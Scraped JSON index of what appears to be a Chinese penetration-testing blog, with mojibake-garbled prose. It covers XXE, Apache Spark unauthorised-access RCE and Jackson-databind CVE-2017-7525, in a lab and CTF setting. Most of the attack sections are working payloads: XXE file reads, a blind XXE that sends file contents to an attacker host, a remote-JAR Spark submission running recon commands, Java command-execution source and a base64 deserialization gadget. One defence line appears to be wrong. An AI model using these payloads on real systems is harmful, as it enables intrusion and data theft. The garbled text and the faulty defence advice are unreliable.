æ¼æ´ä¸»è¦æ˜¯ç”±äºå¤–éƒ¨å®ä½“å¯ä»¥è§£æå¤–éƒ¨æ–‡ä»¶çš„ç‰¹æ€§ã€‚ å‚æ•°å®ä½“ï¼š å‚æ•°å®ä½“åªç”¨äº DTD å’Œæ–‡æ¡£çš„å†…éƒ¨å­é›†ä¸­ï¼ŒXML çš„è§„èŒƒå®šä¹‰ä¸­ï¼Œåªæœ‰åœ¨ DTD ä¸­æ‰èƒ½å¼•ç”¨å‚æ•°å®ä½“ã€‚å‚æ•°å®ä½“çš„å£°æ˜å’Œå¼•ç”¨éƒ½æ˜¯ä»¥ç™¾åˆ†å· %ã€‚å¹¶ä¸”å‚æ•°å®ä½“çš„å¼•ç”¨åœ¨ DTD æ˜¯ç†è§£è§£æçš„ï¼Œæ›¿æ¢æ–‡æœ¬å°†å˜æˆ DTD çš„ä¸€éƒ¨åˆ†ã€‚è¯¥ç±»å‹çš„å®ä½“ç”¨â€œï¼…â€å­—ç¬¦ï¼ˆæˆ–åå…­è¿›åˆ¶ç¼–ç çš„ ï¼…ï¼‰ã€‚ å‚æ•°å®ä½“åªèƒ½ç”¨åœ¨ DTD ä¸­ã€‚ \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE root[ \u003c!ELEMENT root (message) \u003e \u003c!ENTITY % param1 \"\u003c!ENTITY internal 'http://xxx.com'\u003e\"\u003e %param1; ]\u003e \u003croot\u003e \u003cmessage\u003e\u0026internal;\u003c/message\u003e \u003c/root\u003e å‚æ•°å®ä½“å¸¸ç”¨åœ¨æ— å›æ˜¾çš„ XXE ä¸­ã€‚ ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3 XXE å±å®³ ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.1 è¯»å–ä»»æ„æ–‡ä»¶ 3.1.1 æœ‰å›ç° ä»¥ vulhub ä¸Šçš„é¶åœºä¸ºä¾‹ï¼š payloadï¼š \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ELEMENT name ANY \u003e \u003c!ENTITY data SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u003croot\u003e \u003cname\u003e\u0026data;\u003c/name\u003e \u003c/root\u003e 3.1.2 æ— å›æ˜¾ blind xxe çš„åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯å»ºç«‹ä¸€æ¡å¸¦å¤–ä¿¡é“æå–æ•°æ®ï¼Œåˆ©ç”¨å¤–éƒ¨å®ä½“ä¸­çš„ URL å‘å‡ºè®¿é—®ï¼Œåˆ©ç”¨æ”»å‡»è€…çš„å…¬ç½‘ä¸»æœºæ¥æ”¶æ•°æ®ï¼Œä»è€Œè¾¾åˆ°æ•°æ®çš„è¯»å–ã€‚ æ”»å‡»è€…å‘å­˜åœ¨ XXE æ¼æ´çš„æœåŠ¡å™¨å‘é€äº†ä¸€æ¡ payloadï¼Œè¿™ä¸ª payload çš„åŠŸèƒ½æ˜¯æŸ¥æ‰¾æœåŠ¡å™¨æœ¬æœºæŸä¸ªæ–‡ä»¶ï¼Œç„¶åå‘æ”»å‡»è€…çš„æœåŠ¡å™¨è¯·æ±‚ä¸€æ¡ URL è¯·æ±‚ï¼Œè·å–è¿™ä¸ªæ¶æ„çš„ DTD å†…å®¹ï¼Œå½“å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨è¯»å–åˆ°è¿™ä¸ª DTD çš„å†…å®¹ä¸ºæŠŠä¸€å¼€å§‹è‡ªå·±æ‰¾çš„æœ¬åœ°çš„é‚£ä¸ªæ–‡ä»¶å†…å®¹åšä¸ºå‚æ•°å»ä¼ é€’ç»™æ”»å‡»è€…æœåŠ¡å™¨çš„è¿™ä¸ª php æ–‡ä»¶ï¼Œè¿™ä¸ª php çš„æ–‡ä»¶æ˜¯æŠŠè·å–çš„è¿™ä¸ªå‚æ•°æœ¬åœ°ä¿å­˜ä¸‹æ¥ï¼Œä»è€Œï¼Œå°±è¿™æ ·çš„å¾—åˆ°äº†å›æ˜¾çš„å†…å®¹ã€‚ payloadï¼š \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY\u003e \u003c!ENTITY % evil SYSTEM \"file:///etc/passwd\"\u003e \u003c!-- æˆ–è€…ä»¥ä¼ªåè®®ç¼–ç å½¢å¼è¯»å– php://filter/read=convert.base64-encode/resource=conf.php --\u003e \u003c!ENTITY % xxe SYSTEM \"http://IP/dtd.xml\"\u003e %xxe; %all; ]\u003e \u003cfoo\u003e\u0026send;\u003c/foo\u003e dtd.xml \u003c!ENTITY % all \"\u003c!ENTITY send SYSTEM 'http://IP/receive.php?p=%evil;'\u003e\"\u003e åœ¨å†…éƒ¨ DTD é‡Œï¼Œ å‚æ•°å®ä½“å¼•ç”¨åªèƒ½å’Œå…ƒç´ åŒçº§è€Œä¸èƒ½ç›´æ¥å‡ºç°åœ¨å…ƒç´ å£°æ˜å†…éƒ¨ï¼Œå¦åˆ™parser ä¼šæŠ¥é”™ï¼š PEReferences forbidden in internal subset ã€‚ ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.2 æ‰§è¡Œå‘½ä»¤ éœ€è¦å®‰è£… expect æ‰©å±• \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ELEMENT name ANY \u003e \u003c!ENTITY xxe SYSTEM \"expect://id\"\u003e]\u003e \u003cxxe\u003e \u003cname\u003e\u0026xxe;\u003c/name\u003e \u003c/xxe\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.3 æ‹’ç»æœåŠ¡æ”»å‡» \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ELEMENT name ANY \u003e \u003c!ENTITY xxe SYSTEM \"file:///dev/random\"\u003e]\u003e \u003cxxe\u003e \u003cname\u003e\u0026xxe;\u003c/name\u003e \u003c/xxe\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4 CTF é¢˜ç›® ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4.1 DEMO 1 http://web.jarvisoj.com:9882 é¢˜ç›®æè¿°ï¼šè¯·è·å– /home/ctf/flag.txt ä¸‹çš„å†…å®¹ è®¿é—® webï¼Œç‚¹å‡» Goï¼Œåœ¨ burpsuite ä¸­æŠ“åˆ°è¯·æ±‚åŒ… POST /api/v1.0/try HTTP/1.1 Host: web.jarvisoj.com:9882 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 36 Origin: http://web.jarvisoj.com:9882 Connection: close Referer: http://web.jarvisoj.com:9882/ {\"search\":\"type sth!\",\"value\":\"own\"} å°† Content-Type æ”¹ä¸º application/xmlï¼Œæäº¤ pocï¼š ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4.2 DEMO 2 æºç ï¼š \u003c?php function __autoload($cls) { include $cls; } class Black { public function __construct($string, $default, $keyword, $store) { if ($string) ini_set(\"highlight.string\", \"#0d0d0d\"); if ($default) ini_set(\"highlight.default\", \"#0d0d0d\"); if ($keyword) ini_set(\"highlight.keyword\", \"#0d0d0d\"); if ($store) { setcookie('theme', \"Black-\".$string.\"-\".$default.\"-\".$keyword, 0, '/'); } } } class Green { public function __construct($string, $default, $keyword, $store) { if ($string) ini_set(\"highlight.string\", \"#00fb00\"); if ($default) ini_set(\"highlight.default\", \"#00fb00\"); if ($keyword) ini_set(\"highlight.keyword\", \"#00fb00\"); if ($store) { setcookie('theme', \"Green-\".$string.\"-\".$default.\"-\".$keyword, 0, '/'); } } } if ($_=@$_GET['theme']) { if (in_array($_, [\"Black\", \"Green\"])) { if (@class_exists($_)) { ($string = @$_GET['string']) || $string = false; ($default = @$_GET['default']) || $default = false; ($keyword = @$_GET['keyword']) || $keyword = false; new $_($string, $default, $keyword, @$_GET['store']); } } } else if ($_=@$_COOKIE['theme']) { $args = explode('-', $_); if (class_exists($args[0])) { new $args[0]($args[1], $args[2], $args[3], ''); } } else if ($_=@$_GET['info']) { phpinfo(); } highlight_file(__FILE__); å¯ä»¥çœ‹åˆ°åœ¨æ ¹æ® cookie åŠ è½½ä¸»é¢˜ç±»çš„åœ°æ–¹æ²¡æœ‰åˆ¤æ–­ cookie æ˜¯å¦è¢«ç¯¡æ”¹ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä»»æ„ç±» new $args[0]($args[1], $args[2], $args[3], '');ã€‚ å¯»æ‰¾å†…ç½®çš„ php åŸç”Ÿç±»ï¼Œä¸”è¯¥ç±»çš„å®ä¾‹åŒ–å‚æ•°è¦ä¸ $args[0]($args[1], $args[2], $args[3], '') ç›¸å¯¹åº”ï¼Œç±» SimpleXMLElement ç¬¦åˆä¸Šè¿°è¦æ±‚ã€‚ å› æ­¤å¯ä»¥é€šè¿‡ Blind XXE è¯»å– /flag.php æ–‡ä»¶ payloadï¼š Cookie:theme=SimpleXMLElement-http://ip/xxe.xml-2-true è¿œç«¯ xxe.xml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\"\u003e \u003c!ENTITY % remote SYSTEM \"http://IP/xxe.dtd\"\u003e %remote; %all; ]\u003e \u003cfoo\u003e\u0026send;\u003c/foo\u003e xxe.dtd \u003c!ENTITY % all \"\u003c!ENTITY send SYSTEM 'http://IP/receive.php?file=%file;'\u003e\"\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"5 é˜²å¾¡ ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• PHP libxml ç‰ˆæœ¬ä½äº 2.9.1 é»˜è®¤å¼€å¯ \u003c?php libxml_disable_entity_loader (false); ?\u003e è¿‡æ»¤ç”¨æˆ·æäº¤çš„ XML æ•°æ®ï¼Œå¦‚å…³é”®å­— SYSTEMã€ PUBLIC ç­‰ã€‚ ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","tags":["æ¼æ´å¤ç°","vulhub","Spark"],"title":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´ Apache Spark æ˜¯ä¸€æ¬¾é›†ç¾¤è®¡ç®—ç³»ç»Ÿï¼Œå…¶æ”¯æŒç”¨æˆ·å‘ç®¡ç†èŠ‚ç‚¹æäº¤åº”ç”¨ï¼Œå¹¶åˆ†å‘ç»™é›†ç¾¤æ‰§è¡Œã€‚å¦‚æœç®¡ç†èŠ‚ç‚¹æœªå¯åŠ¨ ACLï¼ˆè®¿é—®æ§åˆ¶ï¼‰ï¼Œæˆ‘ä»¬å°†å¯ä»¥åœ¨é›†ç¾¤ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚ ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["æ¼æ´å¤ç°","vulhub","Spark"],"title":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"æ¼æ´ç¯å¢ƒ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†ä»¥ standalone æ¨¡å¼å¯åŠ¨ä¸€ä¸ª Apache Spark é›†ç¾¤ï¼Œé›†ç¾¤é‡Œæœ‰ä¸€ä¸ª master ä¸ä¸€ä¸ª slaveï¼š docker-compose up -d ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—®http://your-ip:8080å³å¯çœ‹åˆ° master çš„ç®¡ç†é¡µé¢ï¼Œè®¿é—®http://your-ip:8081å³å¯çœ‹åˆ° slave çš„ç®¡ç†é¡µé¢ã€‚ ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["æ¼æ´å¤ç°","vulhub","Spark"],"title":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"æ¼æ´åˆ©ç”¨ è¯¥æ¼æ´æœ¬è´¨æ˜¯æœªæˆæƒçš„ç”¨æˆ·å¯ä»¥å‘ç®¡ç†èŠ‚ç‚¹æäº¤ä¸€ä¸ªåº”ç”¨ï¼Œè¿™ä¸ªåº”ç”¨å®é™…ä¸Šæ˜¯æ¶æ„ä»£ç ã€‚ æäº¤æ–¹å¼æœ‰ä¸¤ç§ï¼š åˆ©ç”¨REST API åˆ©ç”¨ submissions ç½‘å…³ï¼ˆé›†æˆåœ¨ 7077 ç«¯å£ä¸­ï¼‰ åº”ç”¨å¯ä»¥æ˜¯ Java æˆ– Pythonï¼Œå°±æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ç±» import java.io.BufferedReader; import java.io.InputStreamReader; public class Exploit { public static void main(String[] args) throws Exception { String[] cmds = args[0].split(\",\"); for (String cmd : cmds) { System.out.println(cmd); System.out.println(executeCommand(cmd.trim())); System.out.println(\"==============================================\"); } } // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/ private static String executeCommand(String command) { StringBuilder output = new StringBuilder(); try { Process p = Runtime.getRuntime().exec(command); p.waitFor(); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { output.append(line).append(\"\\n\"); } } catch (Exception e) { e.printStackTrace(); } return output.toString(); } } å°†å…¶ç¼–è¯‘æˆ JARï¼Œæ”¾åœ¨ä»»æ„ä¸€ä¸ª HTTP æˆ– FTP ä¸Š: https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":["æ¼æ´å¤ç°","vulhub","Spark"],"title":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"ç”¨ REST API æ–¹å¼æäº¤åº”ç”¨: standalone æ¨¡å¼ä¸‹ï¼Œmaster å°†åœ¨ 6066 ç«¯å£å¯åŠ¨ä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å‘è¿™ä¸ªç«¯å£æäº¤ REST æ ¼å¼çš„ APIï¼š POST /v1/submissions/create HTTP/1.1 Host: your-ip:6066 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Content-Type: application/json Connection: close Content-Length: 680 { \"action\": \"CreateSubmissionRequest\", \"clientSparkVersion\": \"2.3.1\", \"appArgs\": [ \"whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf\" ], \"appResource\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"environmentVariables\": { \"SPARK_ENV_LOADED\": \"1\" }, \"mainClass\": \"Exploit\", \"sparkProperties\": { \"spark.jars\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"spark.driver.supervise\": \"false\", \"spark.app.name\": \"Exploit\", \"spark.eventLog.enabled\": \"true\", \"spark.submit.deployMode\": \"cluster\", \"spark.master\": \"spark://your-ip:6066\" } } å…¶ä¸­ï¼Œspark.jars å³æ˜¯ç¼–è¯‘å¥½çš„åº”ç”¨ï¼ŒmainClass æ˜¯å¾…è¿è¡Œçš„ç±»ï¼ŒappArgs æ˜¯ä¼ ç»™åº”ç”¨çš„å‚æ•°ã€‚ è¿”å›çš„åŒ…ä¸­æœ‰ submissionIdï¼Œç„¶åè®¿é—® http://your-ip:8081/logPage/?driverId={submissionId}\u0026logType=stdoutï¼Œå³å¯æŸ¥çœ‹æ‰§è¡Œç»“æœï¼š æ³¨æ„ï¼Œæäº¤åº”ç”¨æ˜¯åœ¨ master ä¸­ï¼ŒæŸ¥çœ‹ç»“æœæ˜¯åœ¨å…·ä½“æ‰§è¡Œè¿™ä¸ªåº”ç”¨çš„ slave é‡Œï¼ˆé»˜è®¤8081ç«¯å£ï¼‰ã€‚å®æˆ˜ä¸­ï¼Œç”±äºslaveå¯èƒ½æœ‰å¤šä¸ªã€‚ ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:1","tags":["æ¼æ´å¤ç°","vulhub","Spark"],"title":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"åˆ©ç”¨ submissions ç½‘å…³ å¦‚æœ 6066 ç«¯å£ä¸èƒ½è®¿é—®ï¼Œæˆ–åšäº†æƒé™æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ master çš„ä¸»ç«¯å£ 7077ï¼Œæ¥æäº¤åº”ç”¨ã€‚ æ–¹æ³•æ˜¯åˆ©ç”¨ Apache Spark è‡ªå¸¦çš„è„šæœ¬ bin/spark-submitï¼š bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id å¦‚æœä½ æŒ‡å®šçš„ master å‚æ•°æ˜¯ rest æœåŠ¡å™¨ï¼Œè¿™ä¸ªè„šæœ¬ä¼šå…ˆå°è¯•ä½¿ç”¨ rest api æ¥æäº¤åº”ç”¨ï¼›å¦‚æœå‘ç°ä¸æ˜¯ rest æœåŠ¡å™¨ï¼Œåˆ™ä¼šé™çº§åˆ°ä½¿ç”¨ submission gateway æ¥æäº¤åº”ç”¨ã€‚ æŸ¥çœ‹ç»“æœçš„æ–¹å¼ä¸å‰é¢ä¸€è‡´ã€‚ ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:2","tags":["æ¼æ´å¤ç°","vulhub","Spark"],"title":"Apache Spark æœªæˆæƒè®¿é—®æ¼æ´","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"Jackson-databind ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7525ï¼‰å¤ç°","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"Jackson-databind ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7525ï¼‰","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["æ¼æ´å¤ç°"],"content":"Jackson-databind ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7525ï¼‰ Jackson-databind æ”¯æŒ Polymorphic Deserialization ç‰¹æ€§ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸å¼€å¯ï¼‰ï¼Œå½“ json å­—ç¬¦ä¸²è½¬æ¢çš„ Target class ä¸­æœ‰ polymorph fieldsï¼Œå³å­—æ®µç±»å‹ä¸ºæ¥å£ã€æŠ½è±¡ç±»æˆ– Object ç±»å‹æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ json å­—ç¬¦ä¸²ä¸­æŒ‡å®šå˜é‡çš„å…·ä½“ç±»å‹ (å­ç±»æˆ–æ¥å£å®ç°ç±»)ï¼Œæ¥å®ç°å®ä¾‹åŒ–æŒ‡å®šçš„ç±»ï¼Œå€ŸåŠ©æŸäº›ç‰¹æ®Šçš„ classï¼Œå¦‚ TemplatesImplï¼Œå¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ æ‰€ä»¥ï¼Œæœ¬æ¼æ´åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š å¼€å¯ JacksonPolymorphicDeserializationï¼Œå³è°ƒç”¨ä»¥ä¸‹ä»»æ„æ–¹æ³• objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETE objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); Target class éœ€è¦æœ‰æ— å‚ constructor Target class ä¸­éœ€è¦éœ€è¦æœ‰å­—æ®µç±»å‹ä¸º Interfaceã€abstract classã€Objectï¼Œå¹¶ä¸”ä½¿ç”¨çš„ Gadget éœ€è¦ä¸ºå…¶å­ç±» / å®ç°æ¥å£ ","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/:0:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"Jackson-databind ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7525ï¼‰","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2017-7525 Jackson-databindåœ¨è®¾ç½®Target classæˆå‘˜å˜é‡å‚æ•°å€¼æ—¶ï¼Œè‹¥æ²¡æœ‰å¯¹åº”çš„ getteræ–¹æ³•ï¼Œåˆ™ä¼šä½¿ç”¨SetterlessPropertyè°ƒç”¨getteræ–¹æ³•ï¼Œè·å–å˜é‡ï¼Œç„¶åè®¾ç½®å˜é‡å€¼ã€‚å½“è°ƒç”¨getOutputProperties()æ–¹æ³•æ—¶ï¼Œä¼šåˆå§‹åŒ– transletBytecodesåŒ…å«å­—èŠ‚ç çš„ç±»ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œå…·ä½“å¯å‚è€ƒjava-deserialization-jdk7u21-gadget-noteä¸­å…³äºTemplatesImplçš„è¯´æ˜ã€‚ ä½¿ç”¨JDK7u21çš„com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplä½œä¸ºGadgetï¼Œå‘é€å¦‚ä¸‹è¯·æ±‚ï¼Œå°†ä¼šæ‰§è¡Œtouch /tmp/prove1.txtï¼š POST /exploit HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 1298 { \"param\": [ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", { \"transletBytecodes\": [ \"yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==\" ], \"transletName\": \"a.b\", \"outputProperties\": {} 